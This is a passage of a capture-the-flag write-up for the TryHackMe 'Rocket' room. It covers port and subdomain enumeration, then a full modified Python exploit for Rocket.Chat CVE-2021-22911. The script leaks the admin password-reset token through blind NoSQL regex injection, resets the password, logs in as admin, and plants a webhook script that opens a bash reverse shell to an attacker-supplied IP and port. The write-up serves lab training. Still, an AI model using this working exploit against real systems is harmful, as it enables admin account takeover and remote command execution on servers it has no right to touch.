Room: [Rocket](https://tryhackme.com/room/rocket)

Difficulty: Hard

Overview: In this room enumeration is very important, searching for subdomains, modify an exploit so we can exploit a chat program has well a MongoDb web interface. Find and crack hashes to compromise a Bolt CMS server till we privesc to root through cap_setuid+ep capabilities.

------------------------------------------------------------------------------------------------------------------------------------------------------------------

We will start our enumeration fase with nmap, to scan for all open ports on the target system:

```
nmap -sV -sC -p- rocket.thm -oN nmap.txt

-sV    →  Probe open ports to determine service
-sC    →  Scan using the default set of scripts
-p-    →  Scan all ports
-oN    →  Save the ouput of the scan in a file
```

![image](https://user-images.githubusercontent.com/76821053/128163183-1559a8ae-e8b5-4f78-a682-eee3decda6a7.png)

There are only two ports open on the target system:

22 → OpenSSH 7.6p1
80 → Apache httpd 2.4.29

At the http server we have a normal website, besides finding users emails, there is not much in it:

![image](https://user-images.githubusercontent.com/76821053/128163265-82540661-e891-4bb8-9dde-7ca858de51b8.png)

![image](https://user-images.githubusercontent.com/76821053/128163288-32f290b2-bd3c-4214-9c80-e88d49a4be76.png)

When checking Wappalyzer firefox addon i found out that this webpage was built with Bolt CMS, so we can check if there is a default bolt login portal:

![image](https://user-images.githubusercontent.com/76821053/128163349-549551d0-a871-4e63-8931-e18141340ac9.png)

For now we cannot do much with it, maybe some brute forcing.. but let's leave it for now.
 
Decided to run gobuster to see if we can find any hidden directories:

![image](https://user-images.githubusercontent.com/76821053/128163410-cc9b5a1b-ae6d-4bd2-b2d8-1c1918d4f6ba.png)

Since nothing groundbraking was found with "gobuster" let us try and also search for subdomains:

```
/home/kali/go/bin/ffuf -c -u 'http://rocket.thm' -H 'host: FUZZ.rocket.thm' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 301 -mc all 
```

![image](https://user-images.githubusercontent.com/76821053/128164098-14e2aa19-1ee8-453e-862e-18f246674636.png)

With ffuf we have found a sub-domain that hosts a chat app called rocket.chat. After a quick search at exploit-db.com we can see that there is a recent entry for a Rocket.chat rce exploit.

This exploit has a CVE number of CVE-2021-22911, which let us exploit the server through NoSQL injection, hijacking user accounts (like admin), escalate privileges, and execute arbitrary system commands on the host server.

![image](https://user-images.githubusercontent.com/76821053/128164223-c6f5e70b-7870-4ffb-b7b6-e4d8147e7fdb.png)

There is more information about this exploit at https://blog.sonarsource.com/nosql-injections-in-rocket-chat and at https://github.com/CsEnox/CVE-2021-22911.

We need a normal user to start the exploit, let us create one by registering a new user:

![image](https://user-images.githubusercontent.com/76821053/128164295-0e06ce08-6238-4b3a-9849-8d46286eeea3.png)

Let's assume that the administrator user has the name of admin, since we are in a public chat with him. Also take a look at the rc_token, which is the one we are going to abuse and hijack admin password token through nosql injection.

![image](https://user-images.githubusercontent.com/76821053/128164374-0b2bd4ba-5b0a-41af-b9b3-c05c5e185ea1.png)

Running the exploit against the server may take a while. The injection is time base, so it will take some time to get the token hash.

```
python3 ./rocket_rce_50108.py -u test@test.com -a admin@rocket.thm -t 'http://chat.rocket.thm'
```

When running the exploit, at the end i receive an error.  ****Non-base32 digit found **** . 

![image](https://user-images.githubusercontent.com/76821053/128164476-8b4b1352-044e-48a9-9486-ce130086e4d7.png)

After some web searching i found found out that it errors out because there is no 2fa secret key, so the admin account isn't protected by 2fa. This means that the exploit wasn't able to change the password. Now i need to modify the exploit to not use the 2fa code.

Let us try and change the exploit a bit to see if we can bypass the 2fa code and execute a custom rce.

```python
#!/usr/bin/python

import requests
import string
import time
import hashlib
import json
import argparse

parser = argparse.ArgumentParser(description='RocketChat 3.12.1 RCE')
parser.add_argument('-u', help='Low priv user email [ No 2fa ]', required=True)
parser.add_argument('-a', help='Administrator email', required=True)
parser.add_argument('-t', help='URL (Eg: http://rocketchat.local)', required=True)
parser.add_argument('-i', help='Ip_address', required=True)
parser.add_argument('-p', help='port', required=True)
args = parser.parse_args()


adminmail = args.a
lowprivmail = args.u
target = args.t
port = args.p
ip_address = args.i


def forgotpassword(email,url):
	payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"sendForgotPasswordEmail\\",\\"params\\":[\\"'+email+'\\"]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/sendForgotPasswordEmail", data = payload, headers = headers, verify = False, allow_redirects = False)
	print("[+] Password Reset Email Sent")


def resettoken(url):
	u = url+"/api/v1/method.callAnon/getPasswordPolicy"
	headers={'content-type': 'application/json'}
	token = ""

	num = list(range(0,10))
	string_ints = [str(int) for int in num]
	characters = list(string.ascii_uppercase + string.ascii_lowercase) + list('-')+list('_') + string_ints

	while len(token)!= 43:
		for c in characters:
			payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"getPasswordPolicy\\",\\"params\\":[{\\"token\\":{\\"$regex\\":\\"^%s\\"}}]}"}' % (token + c)
			r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
			time.sleep(0.5)
			if 'Meteor.Error' not in r.text:
				token += c
				print(f"Got: {token}")

	print(f"[+] Got token : {token}")
	return token


def changingpassword(url,token):
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"P@$$w0rd!1234\\"]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/resetPassword", data = payload, headers = headers, verify = False, allow_redirects = False)
	if "error" in r.text:
		exit("[-] Wrong token")
	print("[+] Password was changed !")

def rce(url,ip_address,port):
	# Authenticating
	sha256pass = hashlib.sha256(b'P@$$w0rd!1234').hexdigest()
	headers={'content-type': 'application/json'}
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"email\\":\\"'+"admin@rocket.thm"+'\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
	r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False)
	if "error" in r.text:
		exit("[-] Couldn't authenticate")
	data = json.loads(r.text)
	data =(data['message'])
	userid = data[32:49]
	token = data[60:103]
	print("[+] Succesfully authenticated as administrator")

	# Creating Integration
	payload = '{"enabled":true,"channel":"#general","username":"admin",'
	payload += '"name":"wow","alias":"","avatarUrl":"","emoji":"",'
	payload += '"scriptEnabled":true,"script":'
	payload += '"class Script {\\n\\n  process_incoming_request({ request }) {\\n\\n\\tconst require = console.log.constructor(\'return process.mainModule.require\')();\\n\\tconst { exec } = require(\'child_process\');\\n\\texec(\'bash -c \\\"bash -i >& /dev/tcp/' + str(ip_address) + '/' + str(port) + ' 0>&1\\\"\');\\n}\\n}",'
	payload += '"type":"webhook-incoming"}'

	cookies = {'rc_uid': userid,'rc_token': token}
	headers = {'X-User-Id': userid,'X-Auth-Token': token}
	r = requests.post(url+'/api/v1/integrations.create',cookies=cookies,headers=headers,data=payload)
	data = r.json()
	_id = data["integration"]["_id"]
	token = data["integration"]["token"]

	# Triggering RCE
	u = url + '/hooks/' + _id + '/' +token 
	r = requests.get(u) 
	print(r.text)

############################################################


# Getting Low Priv user
print(f"[+] Resetting admin  password")
## Sending Reset Mail
forgotpassword("admin@rocket.thm",target)

## Getting reset token through blind nosql injection
token = resettoken(target)

## Changing Password
changingpassword(target,token)

## Authenticating and triggering rce
input("Start nc listener on your chosen port and press 'Enter'")
rce(target,ip_address,port)
```
